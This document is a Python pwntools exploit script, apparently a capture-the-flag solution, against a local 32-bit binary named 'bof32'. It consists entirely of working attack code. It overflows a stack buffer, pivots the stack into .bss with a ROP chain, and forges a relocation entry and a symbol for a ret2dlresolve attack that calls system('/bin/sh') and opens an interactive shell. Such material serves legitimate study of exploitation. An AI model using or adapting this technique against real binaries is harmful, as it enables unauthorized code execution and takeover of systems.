# -*- coding: utf-8 -*-
import sys
from pwn import *

context.terminal = ['tmux','sp','-h']

context.arch = 'i386'
p = process('./bof32')
e = ELF('./bof32', checksec=False)

bss = 0x804b000
sz = 0x800
base = bss+sz

rop = flat('a'*0x70,
    e.plt['read'],
    0x8049350, # pop ebx;pop esi;pop edi;pop ebp;ret 
    0, 
    base,
    0x100,
    base-0x4,
    0x08049165,# leave; ret
    ).ljust(0x100, '\0')

p.sendafter('CTF!\n', rop)

rop1 = flat(
    0x8049030, 
    # .plt:08049030    push ds:dword_804B2AC
    # .plt:08049036    jmp  ds:dword_804B2B0
    0x804b800+0x80-0x8048380, # index
    e.plt['write'],
    0x804b818, # => /bin/sh
    0x0,
    0x0,
    "/bin/sh\n"
    ).ljust(0x80, '\0')

dynsym = 0x8048228
dynstr = 0x80482c8
# fake reloc
r_offset = e.got['write']
r_info = ((0x804b888-dynsym)/0x10<<8)+0x7
fake_reloc = p32(r_offset)+p32(r_info)
# fake sym
st_name = p32(0x804b8f8-dynstr)
st_value = p32(0)
st_size = p32(0)
st_info = p8(0)
st_other = p8(0)
st_shndx = p16(0x12)
fake_sym = st_name+st_value+st_size+st_info+st_other+st_shndx
rop1 += fake_reloc+fake_sym
rop1 = rop1.ljust(0xf8,'\x00')
rop1 += 'system'+'\0'*0x2

p.send(rop1)

p.interactive()
